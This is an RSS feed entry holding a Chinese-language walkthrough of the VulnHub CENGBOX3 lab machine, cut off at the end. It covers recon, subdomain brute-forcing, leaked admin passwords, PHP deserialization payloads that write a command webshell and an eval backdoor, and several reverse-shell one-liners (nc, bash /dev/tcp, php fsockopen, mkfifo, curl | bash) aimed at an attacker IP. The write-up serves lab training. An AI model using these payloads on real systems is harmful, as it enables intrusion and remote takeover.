<?xml version="1.0"?>
<rss version="2.0">
    <channel>
        <title>X_T • Posts by &#34;vulnhub 41-50&#34; tag</title>
        <link>https://n1h1l157.github.io</link>
        <description>人生如逆旅，我亦是行人</description>
        <language>zh-CN</language>
        <pubDate>Mon, 01 Nov 2021 00:00:00 +0800</pubDate>
        <lastBuildDate>Mon, 01 Nov 2021 00:00:00 +0800</lastBuildDate>
        <category>ENFJ</category>
        <category>ENTJ</category>
        <category>ENFP</category>
        <category>ENTP</category>
        <category>ESTP</category>
        <category>ESFP</category>
        <category>ESFJ</category>
        <category>INFJ</category>
        <category>INTJ</category>
        <category>INTP</category>
        <category>ESTJ</category>
        <category>ISFJ</category>
        <category>ISFP</category>
        <category>INFP</category>
        <category>ISTJ</category>
        <category>MBTI</category>
        <category>ISTP</category>
        <category>渗透测试</category>
        <category>心理测试</category>
        <category>Trojan</category>
        <category>信息安全网址</category>
        <category>Linux</category>
        <category>生命</category>
        <category>人生</category>
        <category>命运</category>
        <category>成长</category>
        <category>人生哲学</category>
        <category>神学</category>
        <category>意义</category>
        <category>历史</category>
        <category>社会</category>
        <category>爱情</category>
        <category>人性</category>
        <category>道德</category>
        <category>VULNHUB 1-10</category>
        <category>VULNHUB 11-20</category>
        <category>VULNHUB 21-30</category>
        <category>VULNHUB 31-40</category>
        <category>VULNHUB 41-50</category>
        <item>
            <guid isPermalink="true">https://n1h1l157.github.io/2021/11/01/VULNHUB/141%20CENGBOX3/</guid>
            <title>VULNHUB 41 CENGBOX3</title>
            <link>https://n1h1l157.github.io/2021/11/01/VULNHUB/141%20CENGBOX3/</link>
            <category>VULNHUB 41-50</category>
            <pubDate>Mon, 01 Nov 2021 00:00:00 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;靶机下载地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvY2VuZ2JveC0zLDU3Ni8=&#34;&gt;https://www.vulnhub.com/entry/cengbox-3,576/&lt;/span&gt;&lt;br&gt;
 教程链接地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDY4ODA1MC9hcnRpY2xlL2RldGFpbHMvMTE4MDE1OTA3&#34;&gt;https://blog.csdn.net/weixin_50688050/article/details/118015907&lt;/span&gt;&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vc3ltOTQ1L3AvMTQzMDM3MjguaHRtbA==&#34;&gt;https://www.cnblogs.com/sym945/p/14303728.html&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;001-确认攻击目标的财产信息&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#001-确认攻击目标的财产信息&#34;&gt;#&lt;/a&gt; 001 确认攻击目标的财产信息&lt;/h3&gt;
&lt;p&gt;攻击机 kali： 1 92.168.31. 84 (由于设置成了 DHCP、可能多变)&lt;br&gt;
 靶机 CENGBOX 3 ：桥接于 1 92.168.31.1 的网卡，ip 未知&lt;/p&gt;
&lt;p&gt;1 ）确定靶机 ip 地址和开放的端口&lt;br&gt;
由已至内网靶机所在主机 MAC 地址自动扫描靶机服务&lt;br&gt;
 sudo arp-scan -l | grep ‘a0’ | awk ‘{print $1,$2}’ | cut -d ’ ’ -f 1 | xargs sudo nmap -PA&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1121.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;à 靶机 ip：192.168.31. 25 、靶机开放端口 22 , 80 , 443&lt;/p&gt;
&lt;h3 id=&#34;002-信息收集gobuster爆破子域名sqlmap注入登录框&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#002-信息收集gobuster爆破子域名sqlmap注入登录框&#34;&gt;#&lt;/a&gt; 002 信息收集，gobuster 爆破子域名，sqlmap 注入登录框&lt;/h3&gt;
&lt;p&gt;打开 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEu&#34;&gt;http://192.168.31.&lt;/span&gt; 96 / 进行信息收集&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1122.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;打开 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly8xOTIuMTY4LjMx&#34;&gt;https://192.168.31&lt;/span&gt;. 96 / 进行信息收集&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1123.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;点击隐藏详情，输入 thisisunsafe 即可进入该站点&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1124.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;目测是没有什么有价值的信息，直接开始用 gobuster 扫描目录&lt;br&gt;
 gobuster dir -x php,txt,html,zip,rar,jpg,png -w /usr/share/wordlists/dirbuster/directory-&lt;br&gt;
list-2.3-medium.txt -u &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuOTYv&#34;&gt;http://192.168.31.96/&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1125.png&#34; alt&gt;&lt;/p&gt;
&lt;h3 id=&#34;没有找到有价值的目标得去尝试一下-443-端口的网站有没有什么敏感目录&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#没有找到有价值的目标得去尝试一下-443-端口的网站有没有什么敏感目录&#34;&gt;#&lt;/a&gt; 没有找到有价值的目标，得去尝试一下 443 端口的网站有没有什么敏感目录&lt;/h3&gt;
&lt;p&gt;gobuster dir -x php,txt,html,zip,rar,jpg,png -w /usr/share/wordlists/dirbuster/directory-&lt;br&gt;
list-2.3-medium.txt -u &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly8xOTIuMTY4LjMxLjk2Lw==&#34;&gt;https://192.168.31.96/&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1126.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;发现 gobuster 无法爆破此类网址，只能另寻它法，按理说 web 站点必有破绽才&lt;br&gt;
能进一步渗透，但是现在的 web 没有任何的突破口，是不是我们从端口扫描那&lt;br&gt;
里就出现了问题&lt;/p&gt;
&lt;h3 id=&#34;这次通过-a参数详细的扫描一波端口信息看能否获得更多的信息&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#这次通过-a参数详细的扫描一波端口信息看能否获得更多的信息&#34;&gt;#&lt;/a&gt; 这次通过 - A 参数详细的扫描一波端口信息，看能否获得更多的信息&lt;/h3&gt;
&lt;p&gt;发现了一个 ceng-company.vm 的字样，这个可以做为 hosts 做 DNS 解析&lt;br&gt;
 sudo nmap -A -p- 192.168.31.96&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1127.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;修改本地 hosts 文件，将此域名的 DNS 解析指向 ip 地址&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1128.png&#34; alt&gt;&lt;/p&gt;
&lt;h3 id=&#34;解析成功了可以直接访问这个域名了接下来就对这个域名做测试&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#解析成功了可以直接访问这个域名了接下来就对这个域名做测试&#34;&gt;#&lt;/a&gt; 解析成功了，可以直接访问这个域名了，接下来就对这个域名做测试&lt;/h3&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1129.png&#34; alt&gt;&lt;/p&gt;
&lt;h3 id=&#34;首先就是测试目录看有哪些目录&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#首先就是测试目录看有哪些目录&#34;&gt;#&lt;/a&gt; 首先就是测试目录，看有哪些目录&lt;/h3&gt;
&lt;p&gt;gobuster dir -x php,txt,html,zip,rar,jpg,png -w /usr/share/wordlists/dirbuster/directory-&lt;br&gt;
list-2.3-medium.txt -u &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2NlbmctY29tcGFueS52bS8=&#34;&gt;http://ceng-company.vm/&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1130.png&#34; alt&gt;&lt;/p&gt;
&lt;h3 id=&#34;还是这几个目录没有多大的作用下一步对域名做一个子域名扫描&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#还是这几个目录没有多大的作用下一步对域名做一个子域名扫描&#34;&gt;#&lt;/a&gt; 还是这几个目录，没有多大的作用，下一步对域名做一个子域名扫描&lt;/h3&gt;
&lt;p&gt;爆破子域名的时候选用 vhost 参数，字典可以根据自己的习惯选择&lt;br&gt;
这里使用的是 seclists 中的一个子域名爆破字典&lt;br&gt;
 gobuster vhost -u &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2NlbmctY29tcGFueS52bS8=&#34;&gt;http://ceng-company.vm/&lt;/span&gt; - w&lt;br&gt;
/usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1131.png&#34; alt&gt;&lt;/p&gt;
&lt;h3 id=&#34;也可以选用较大的字典爆破子域名&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#也可以选用较大的字典爆破子域名&#34;&gt;#&lt;/a&gt; 也可以选用较大的字典爆破子域名&lt;/h3&gt;
&lt;p&gt;gobuster vhost -u &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2NlbmctY29tcGFueS52bS8=&#34;&gt;http://ceng-company.vm/&lt;/span&gt; - w /usr/share/wordlists/dirb/big.txt&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1132.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;找到一个子域名，同样修改本地 hosts 文件，改变 DNS 解析指向&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1133.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;打开 http://dev.ceng-company.vm 做信息收集&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1134.png&#34; alt&gt;&lt;/p&gt;
&lt;h3 id=&#34;同样的先来做一波目录扫描&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#同样的先来做一波目录扫描&#34;&gt;#&lt;/a&gt; 同样的先来做一波目录扫描&lt;/h3&gt;
&lt;p&gt;gobuster dir -x php,txt,html,zip,rar,jpg,png -w /usr/share/wordlists/dirbuster/directory-&lt;br&gt;
list-2.3-medium.txt -u &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2Rldi5jZW5nLWNvbXBhbnkudm0v&#34;&gt;http://dev.ceng-company.vm/&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1135.png&#34; alt&gt;&lt;/p&gt;
&lt;h3 id=&#34;没有什么敏感的目录目录扫描无法得到更多有效的线索&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#没有什么敏感的目录目录扫描无法得到更多有效的线索&#34;&gt;#&lt;/a&gt; 没有什么敏感的目录，目录扫描无法得到更多有效的线索&lt;/h3&gt;
&lt;p&gt;既然这个子域名的首页是登录框，登录框就可以尝试使用 sql 注入，通过 burp&lt;br&gt;
 将数据包拦截，复制该数据包&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1136.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;通过 sqlmap 指定发送数据为此数据包中的内容&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1137.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;sqlmap -r login.txt --batch --dbs&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1138.png&#34; alt&gt;&lt;/p&gt;
&lt;h3 id=&#34;直接爆破的时候是失败的&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#直接爆破的时候是失败的&#34;&gt;#&lt;/a&gt; 直接爆破的时候是失败的&lt;/h3&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1139.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;指定注入点是 username 时再次尝试&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1140.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;指定注入点是 passwd 时再次尝试&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1141.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;前面几种方式都试了，试不出来此地方是存在 sql 注入的，没有找到其余人是&lt;br&gt;
怎么通过这个点拿到数据库的信息的&lt;/p&gt;
&lt;h3 id=&#34;数据库中的信息如下可通过下列两个账号登陆到后台&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#数据库中的信息如下可通过下列两个账号登陆到后台&#34;&gt;#&lt;/a&gt; 数据库中的信息如下，可通过下列两个账号登陆到后台&lt;/h3&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1142.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;admin@ceng-company.vm：admin*_2020&lt;br&gt;
elizabethsky@ceng-company.vm：walnuttree&lt;/p&gt;
&lt;h3 id=&#34;003-php反序列化get型升级为rce漏洞反弹shell大全&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#003-php反序列化get型升级为rce漏洞反弹shell大全&#34;&gt;#&lt;/a&gt; 003 php 反序列化，GET 型升级为 RCE 漏洞，反弹 shell 大全&lt;/h3&gt;
&lt;p&gt;进入比较高权限的 admin 的后台&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1143.png&#34; alt&gt;&lt;/p&gt;
&lt;h3 id=&#34;这里有一个可以输入的地方输入-1-2-3-尝试是否有回显&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#这里有一个可以输入的地方输入-1-2-3-尝试是否有回显&#34;&gt;#&lt;/a&gt; 这里有一个可以输入的地方，输入 1 ， 2 ， 3 尝试是否有回显&lt;/h3&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1144.png&#34; alt&gt;&lt;/p&gt;
&lt;h3 id=&#34;提交之后显示发送成功并且有一个链接可以跳转&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#提交之后显示发送成功并且有一个链接可以跳转&#34;&gt;#&lt;/a&gt; 提交之后，显示发送成功，并且有一个链接可以跳转&lt;/h3&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1145.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;此链接显示了 1 ， 3 位置的数据，我们可以放一些恶意 payload 尝试&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1146.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;在输入框依次填写如下内容，看 phpinfo 是否会被执行&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1147.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;回显中并没有 phpinfo 的信息，只留下来了第三个位置的数字&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1148.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;把 phpinfo 放在第三个位置看看有没有什么回显&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1149.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;看来 phpinfo 的信息没有被执行，跟 1 ， 3 的位置无关&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1150.png&#34; alt&gt;&lt;/p&gt;
&lt;h3 id=&#34;查看源码里只是以一种字符串的形势存在&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#查看源码里只是以一种字符串的形势存在&#34;&gt;#&lt;/a&gt; 查看源码里，只是以一种字符串的形势存在&lt;/h3&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1151.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;仔细观察 url 地址，发现是一个 url 编码后的地址&lt;br&gt;
通过在线 url 解码：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3d3dy5hYjE3My5jb20vZW5jL3VybGVuY29kZS5waHA=&#34;&gt;http://www.ab173.com/enc/urlencode.php&lt;/span&gt;&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2Rldi5jZW5nLQ==&#34;&gt;http://dev.ceng-&lt;/span&gt;&lt;br&gt;
company.vm/addpoem.php?data=O:4:“Poem”:3:{s:8:“poemName”;s:1:“1”;s:10:“isPo&lt;br&gt;
etrist”;O:8:“poemFile”:2:{s:8:“filename”;s:22:&amp;quot;/var/www/html/poem.txt&amp;quot;;s:8:“poemN&lt;br&gt;
ame”;s:1:“1”;}s:9:“poemLines”;s:18:&amp;quot;&lt;?php phpinfo();?&gt;&amp;quot;;}&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1152.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;发现这就是一个 php 反序列化漏洞，在我们要上传的 phpinfo 的地方出构造一&lt;br&gt;
 GET 方法，通过该 GET 方法调用 php 执行系统命令&lt;br&gt;
 O:4:“Poem”:3:{s:8:“poemName”;s:4:“ada”;s:10:“isPoetrist”;O:8:“poemFile”:2:{s:8:“f&lt;br&gt;
ilename”;s:22:&amp;quot;/var/www/html/poem.php&amp;quot;;s:8:“poemName”;s:47:&amp;quot;&amp;lt;?php echo&lt;br&gt;
shell_exec($_GET[‘cmd’].’ 2&amp;gt;&amp;amp;1’); ?&amp;gt;&amp;quot;;}s:9:“poemLines”;s:4:“adadd”;}&lt;br&gt;
 表示往主站 poem.php 写入一个 cmd 的 GET 方法，方法中的内容用系统执行&lt;/p&gt;
&lt;p&gt;将此内容进行 url 编码后添加到 http://dev.ceng-company.vm/addpoem.php?data=&lt;br&gt;
 执行之后没有报错，poem.php 文件写入成功&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1153.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;执行 id 方法，输出 id 的一些信息&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1154.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;查看 ifconfig 的 ip 信息时，通过查看源代码也能很方便的看到&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1155.png&#34; alt&gt;&lt;/p&gt;
&lt;h3 id=&#34;现在这个地方已经被升级成为了rce命令执行漏洞&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#现在这个地方已经被升级成为了rce命令执行漏洞&#34;&gt;#&lt;/a&gt; 现在这个地方已经被升级成为了 RCE 命令执行漏洞&lt;/h3&gt;
&lt;p&gt;查看服务器有下列哪些反弹 shell 的命令&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2Nlbmct&#34;&gt; http://ceng-&lt;/span&gt;&lt;br&gt;
company.vm/poem.php?cmd=which%20python;which%20nc;which%20curl;which%&lt;br&gt;
20wget;which%20php&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1156.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;发现存在 nc，curl，wget，php 可以依次尝试使用反弹 shell 的命令&lt;br&gt;
 nc 192.168.31. 84 4445 - e /bin/bash&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1157.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;bash -c ‘bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.31. 84 /444 5 0&amp;gt;&amp;amp;1’&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1158.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.31. 84 /444 5 0&amp;gt;&amp;amp;1&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1159.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;php -r ‘$sock=fsockopen(“192.168.31. 84 “,444 5 );exec(”/bin/sh -i &amp;lt;&amp;amp;3 &amp;gt;&amp;amp;3 2&amp;gt;&amp;amp;3”);’&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1160.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;如果有服务器的话，可以直接接服务器的马执行，这里我没有开启远程公网 ip&lt;br&gt;
 上的服务器，就直接在本地开了一个简易的 web&lt;br&gt;
 在 1 92.168.31.25 的机器上&lt;br&gt;
 cat &amp;gt; &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3NoZWxsLnNo&#34;&gt;shell.sh&lt;/span&gt; &amp;lt;&amp;lt; EOF&lt;br&gt;
#! /bin/bash&lt;br&gt;
bash -c ‘bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.31.84/4444 0&amp;gt;&amp;amp;1’&lt;br&gt;
EOF&lt;br&gt;
python 3 - m httpserver 80&lt;/p&gt;
&lt;p&gt;在 1 92.168.31. 84 的机器上&lt;br&gt;
 nc - lvvp 4444&lt;/p&gt;
&lt;p&gt;通过网站去执行：curl &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMjUvc2hlbGwuc2g=&#34;&gt;http://192.168.31.25/shell.sh&lt;/span&gt; | bash&lt;br&gt;
 表示加载 shell.sh 的内容之后用 bash 去执行&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1161.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;最后通过 curl 的方式拿到了 webshell，利用相关代码进行标准 shell 的输出&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1162.png&#34; alt&gt;&lt;/p&gt;
&lt;h3 id=&#34;004-php反序列化post型通过蚁剑上传马mkfifo使用&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#004-php反序列化post型通过蚁剑上传马mkfifo使用&#34;&gt;#&lt;/a&gt; 004 php 反序列化，POST 型通过蚁剑上传马，mkfifo 使用&lt;/h3&gt;
&lt;h3 id=&#34;既然我们可以通过get型的注入升级为rce看看有没有其他的方法&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#既然我们可以通过get型的注入升级为rce看看有没有其他的方法&#34;&gt;#&lt;/a&gt; 既然我们可以通过 GET 型的注入升级为 RCE，看看有没有其他的方法&lt;/h3&gt;
&lt;p&gt;先搞一个简单的 phpinfo 给指定路径上传 phpinfo 进行执行&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1163.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;O:4:“Poem”:3:{s:8:“poemName”;s:3:“aba”;s:10:“isPoetrist”;O:8:“poemFile”:2:{s:8:“f&lt;br&gt;
ilename”;s:18:&amp;quot;/var/www/html/x.php&amp;quot;;s:8:“poemName”;s:18:&amp;quot;&amp;lt;?php&lt;br&gt;
phpinfo();?&amp;gt;&amp;quot;;}s:9:“poemLines”;s:3:“aba”;}&lt;br&gt;
 意指往主站 x.php 上打印一个&lt;?php phpinfo();?&gt;的记录&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1164.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;url 编码后去执行这个 x.php，回显出来了 phpinfo 的信息&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1165.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;用 post 型参数，上传一句话后门到主站的 y.php&lt;br&gt;
O:4:“Poem”:3:{s:8:“poemName”;s:3:“aba”;s:10:“isPoetrist”;O:8:“poemFile”:2:{s:8:“f&lt;br&gt;
ilename”;s:19:&amp;quot;/var/www/html/y.php&amp;quot;;s:8:“poemName”;s:27:&amp;quot;&amp;lt;?php&lt;br&gt;
@eval($_POST[‘x’]);?&amp;gt;&amp;quot;;}s:9:“poemLines”;s:3:“aba”;}&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1166.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;url 编码后通过 url 执行，成功写到网站根目录上&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1167.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;POST 型木马可以通过蚁剑等工具直接链接，地址是主站的 y.php，密码是 x&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1168.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;通过写如下新文件，将服务器的 shell 反弹出来&lt;/p&gt;
&lt;?php system(&#34;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.31.8 4
4445 &gt;/tmp/f&#34;);?&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1169.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;指的是如果存在命名管道 /tmp/f 先删掉它，然后新建一个命名管道 /tmp/f，并&lt;br&gt;
且通过 cat 往命名管道中打印 /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 192.168.31.8 4 4445 这个&lt;br&gt;
命令，/bin/sh -i 2&amp;gt;&amp;amp;1|nc 192.168.31.8 4 4445 表示用 sh 强制交互式执行并将输出&lt;br&gt;
结果重定向，然后将输出内容反弹到 1 92.168.31.8 4 的 4445 端口上&lt;/p&gt;
&lt;p&gt;nc - lvvp 4445&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1170.png&#34; alt&gt;&lt;/p&gt;
&lt;h3 id=&#34;fifo最大的特性就是每个fifo都有一个路径名与之相关联从而允许无亲缘关&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#fifo最大的特性就是每个fifo都有一个路径名与之相关联从而允许无亲缘关&#34;&gt;#&lt;/a&gt; FIFO 最大的特性就是每个 FIFO 都有一个路径名与之相关联，从而允许无亲缘关&lt;/h3&gt;
&lt;p&gt;系的任意两个进程间通过 FIFO 进行通信命名管道的用途主要有：（ 1 ）shell 命&lt;br&gt;
名使用 FIFO 将数据从一条管道传送到另一条时，无须创建中间临时文件；（ 2 ）&lt;br&gt;
在客户进程和服务器进程间传送数据。&lt;br&gt;
一般的管道符号只能将前者的输出做为后者的输入，而命名管道却可以将无关系&lt;br&gt;
的两个进程之间建立通信。如可以使用一行 SHELL 命令如下：&lt;br&gt;
rm /tmp/f;mkfifo /tmp/f;nohup ifconfig &amp;gt;/tmp/f &amp;gt;/dev/null 2&amp;gt;&amp;amp;1 &amp;amp; ;cut -d ’ ’ -f 1,2,3,4&lt;br&gt;
&amp;lt; /tmp/f | head -n 20 | tail -n 10&lt;/p&gt;
&lt;h3 id=&#34;对终端进行调整输出一个较为美观的终端&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#对终端进行调整输出一个较为美观的终端&#34;&gt;#&lt;/a&gt; 对终端进行调整，输出一个较为美观的终端&lt;/h3&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1171.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;既然可以通过 POST 间接的使用 mkfifo 注入 RCE，那么是否可以直接在 php 反&lt;br&gt;
序列化里边直接上传 mkfifo 的命令反弹 shell 呢，尝试一下&lt;br&gt;
 O:4:“Poem”:3:{s:8:“poemName”;s:3:“aba”;s:10:“isPoetrist”;O:8:“poemFile”:2:{s:8:“f&lt;br&gt;
ilename”;s:19:&amp;quot;/var/www/html/z.php&amp;quot;;s:8:“poemName”;s💯&amp;quot;&amp;lt;?php system(“rm&lt;br&gt;
/tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 192.168.31.135&lt;br&gt;
4444 &amp;gt;/tmp/f”);?&amp;gt;&amp;quot;;}s:9:“poemLines”;s:3:“aba”;}&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1172.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;提示上传成功了，但是在 z.php 执行的时候失败的，这种方法可能被过滤掉了，&lt;br&gt;
因此目前只有通过注入 GET 参数，在 url 界面使用 curl 反弹或者注入 POST 参&lt;br&gt;
